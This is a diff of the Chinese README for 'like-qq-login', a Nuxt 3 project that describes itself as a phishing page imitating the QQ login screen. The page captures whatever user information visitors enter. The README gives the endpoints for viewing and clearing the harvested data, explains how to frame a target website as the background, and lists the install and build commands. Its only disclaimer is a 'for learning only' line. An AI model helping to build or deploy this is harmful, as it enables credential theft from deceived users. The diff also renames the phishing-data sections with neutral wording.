@@ -1,7 +1,7 @@
 # like-qq-login
 
 ## 作用
-钓鱼
+钓鱼页面，获取当前页面用户输入的用户信息
 
 ## 效果
 
@@ -11,13 +11,13 @@
 
 ![b69b1f37e371516e32e8a22ee961f4a](https://user-images.githubusercontent.com/32216292/200274545-4af6962d-90a3-4884-8a56-f618e5b9083c.jpg)
 
-## 获取钓到的数据
+## 查看数据
 ```
 // 请根据您实际的地址来，在浏览器访问
 localhost:3000/qop/show
 ```
 ![b69b1f37e371516e32e8a22ee961f4a](https://user-images.githubusercontent.com/32216292/200274545-4af6962d-90a3-4884-8a56-f618e5b9083c.jpg)
-## 清空钓到的数据
+## 清空数据
 ```
 // 请根据您实际的地址来，在浏览器访问
 localhost:3000/qop/delete
@@ -25,56 +25,41 @@ localhost:3000/qop/delete
 
 ## 改变背景
 ```
-// pages/index.vue 找到
-<embed v-if="loadEmbed" src="/game.html" width="100%" class="h-screen"/>
-
-// 换成你需要套的网页
+// 在 pages/index.vue 页面，找到 embed， src 换成目标网站URL即可
 <embed v-if="loadEmbed" src="http://youself.site" width="100%" class="h-screen"/>
 ```
 
 ## 声明
 仅供学习参考
 
-
-# Nuxt 3 Minimal Starter
-
-Look at the [nuxt 3 documentation](https://v3.nuxtjs.org) to learn more.
-
-## Setup
-
-Make sure to install the dependencies:
+## 使用方式
 
 ```bash
+# 安装 node.js 后，全局安装 yarn
+npm install -g yarn
+
 # yarn
 yarn install
-
-# npm
-npm install
-
-# pnpm
-pnpm install --shamefully-hoist
 ```
 
-## Development Server
+## 开发模式，默认 3000 端口
 
 Start the development server on http://localhost:3000
 
 ```bash
-npm run dev
+yarn dev
 ```
 
-## Production
+## 编译，用于正式环境
+```bash
+yarn build
+```
 
-Build the application for production:
+本地预编译:
 
 ```bash
-npm run build
+yarn run preview
 ```
 
-Locally preview production build:
+nuxt 文档 [nuxt3](https://v3.nuxtjs.org/guide/deploy/presets).
 
-```bash
-npm run preview
-```
-
-Checkout the [deployment documentation](https://v3.nuxtjs.org/guide/deploy/presets) for more information.
